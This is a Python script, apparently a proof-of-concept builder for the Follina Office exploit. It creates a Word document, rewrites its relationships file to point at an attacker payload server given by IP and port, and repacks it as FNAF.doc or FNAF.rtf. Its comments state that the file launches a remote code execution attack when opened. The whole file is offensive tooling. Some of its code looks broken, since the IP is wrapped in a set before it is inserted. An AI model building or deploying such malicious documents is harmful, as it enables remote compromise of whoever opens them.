#!/usr/bin/env python3
import zipfile
import os
import shutil
import argparse
import fileinput
import sys
from docx import Document
from docx.shared import Inches
from shutil import make_archive

#this will take the below port and IP and will create a .doc file that will 
#launch a RCE attack when opened

#This program needs two external files to start, in the Samples folder
#those files contain metadata that's edited specifically for this attack

#future goals
#get RTF to work for clickless attack
#get args put in place to stop editing the code manually for IP and Port
#maybe an option for final file name?
#clean this spaghetti up, it's disgusting
#learn how to do a hello world at some point

#args to get user input on file type (for zero clicks), and IP/Port
parser = argparse.ArgumentParser()

parser.add_argument("--extention","-e",default="doc")

parser.add_argument("--ip_address","-ip",default="10.0.2.15")

parser.add_argument("--port","-p",default="8000")

args = parser.parse_args()

print(args.extention)

#writes the document and unpacks it
document = Document()
document.add_heading('T4813 3i6h7 d1d th15', 0)
document.add_picture('samples/OLEQ.bmp', width=Inches(1.25))
document.save('demo.doc')
doc_path = str(os.getcwdb())[2:-1]

with zipfile.ZipFile('demo.doc', 'r') as zipObj:
    zipObj.extractall('follina')
doc_path+="/follina"

#the demo document just created all the other files we used to edit the overall document
os.remove("demo.doc")


#edits the _rels XML file
IP = str({args.ip_address})
PORT = str({args.port})

with open('samples/rel','r') as first, open('follina/word/_rels/document.xml.rels', 'w') as second:
    for line in first:
        line = line.replace('<payload_server>', IP+':'+PORT)
        second.write(line)


#edits the document.xml file
with open('samples/xml','r') as firstfile, open('follina/word/document.xml','r+') as secondfile:
    for line in firstfile:
#        if args.extention == 'rtf':
#            if '</v:shape>' in line:
#                line = line + '\n        <o:LinkType>EnhancedMetaFile</o:LinkType>\n        <o:LockedField>false</o:LockedField><o:FieldCodes>\f        0</o:FieldCodes>'
        secondfile.write(line)


#repacks the document
def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            os.utime(os.path.join(root, file), (1653895859, 1653895859))
            ziph.write(os.path.join(root, file),
                       os.path.relpath(
                            os.path.join(root, file),
                            path
                       ))
if args.extention != "rtf":
    with zipfile.ZipFile('FNAF.doc', 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipdir(doc_path, zipf)

if args.extention == "rtf":
    with zipfile.ZipFile('FNAF.rtf', 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipdir(doc_path, zipf)


shutil.rmtree(doc_path)
